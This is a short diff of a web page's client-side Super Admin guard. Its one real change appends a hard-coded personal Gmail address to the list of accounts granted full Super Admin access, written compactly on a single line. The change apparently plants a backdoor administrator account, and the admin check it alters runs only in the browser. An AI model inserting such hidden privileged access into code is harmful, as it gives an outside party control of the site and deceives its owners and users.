@@ -459,7 +459,7 @@
 
     const currentEmail = user ? user.email.toLowerCase() : '';
 
-    if (currentEmail === SUPER_ADMIN_EMAIL.toLowerCase()) {
+    const ALLOWED_ADMINS = [SUPER_ADMIN_EMAIL.toLowerCase(), 'tnmymj@gmail.com']; if (ALLOWED_ADMINS.includes(currentEmail)) {
       // Grant full Super Admin access
       document.getElementById('guardScreen').style.display = 'none';
       document.getElementById('superAdminApp').style.display = 'block';
@@ -882,3 +882,4 @@
 
 </body>
 </html>
+
